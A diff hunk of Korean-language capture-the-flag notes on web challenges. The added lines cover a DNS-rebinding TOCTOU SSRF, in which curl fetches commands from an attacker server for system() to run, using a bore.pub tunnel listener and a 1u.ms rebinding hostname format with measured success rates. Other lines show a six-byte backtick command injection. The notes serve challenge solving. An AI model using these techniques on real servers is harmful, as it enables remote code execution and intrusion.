@@ -281,8 +281,12 @@ await fetch('/challenge/web-01/', {credentials:'include'}).then(r=>r.text())
 - **DNS 리바인딩 TOCTOU SSRF(sleep 사이 재해석)**: `gethostbyname($Host)===<정답IP>` 통과 → `sleep(1)` → `curl http://$Host/..`가
   **재해석**하는 구조면, 검사 시점엔 정답IP·fetch 시점엔 공격자IP로 리바인딩하는 호스트(rbndr.us류)로 공격. curl이 가져온 응답
   본문을 `system()`하면 공격자 서버가 `/cmd/<cmd>.txt`(200, body=실행할 명령)를 서빙. 입력이 `rawurlencode`되면 경로 traversal
-  불가하고 고정 .txt만 유효 → **공격자 서버가 유일 경로**. 공인 **인바운드 리스너(해당 포트) + 리바인딩 DNS** 없으면 인프라게이트
-  (old-31/37/38 동류). (child toctou)
+  불가하고 고정 .txt만 유효 → **공격자 서버가 유일 경로**. 리스너는 위 (3) `bore.pub`(IPv4 리터럴, `--remote-port 10020`)로 확보.
+  **리바인드 DNS 실측(중요)**: `rbndr`(TTL=1 랜덤)은 **실패** — 챌린지 리졸버가 TTL=1을 캐시 바닥값으로 올려 한 값에 고정(100/100 미스).
+  **1u.ms 상태형 TOCTOU 리바인드(TTL=0)로 성공**: `<nonce>.make-<정답IP를 대시로>-rebind-<공격자IP를 대시로>-rr.1u.ms` 형식이
+  **첫 질의엔 정답IP(검사 통과), 이후 5초 내 질의엔 공격자IP**(=`sleep(1)` 지연된 curl)를 결정적으로 반환한다. **매 시도 새 nonce**로
+  캐시불가 이름 + 새 5초 상태를 준다 → 첫 프로브에 성공, 2/3 재현(가끔 curl의 lookup도 정답IP면 미스 → 재시도). 건드리기 전 자기
+  curl로 터널 검증. (child toctou 실해결; old-37/38은 여전히 인프라/프록시 게이트.)
 - **6자 cmd-injection(이중따옴표 echo) = 백틱 치환, 단 읽기엔 부족할 수 있음**: `system("...echo \"hello! {$id}\"")`에서 `$id`가
   6바이트면 **따옴표 깨기 불필요** — 백틱 `` `ls /` ``(6B)이 echo 문자열 안에서 치환 실행된다(따옴표 균형 유지, `$()`도 가능).
   단 `/bin/sh`=dash. 백틱 오버헤드 2B라 **실효 4자**뿐(`` `nl *` ``=6B=cwd 읽기, `` `sh f` ``/`` `. f` ``=스테이징 파일 실행).
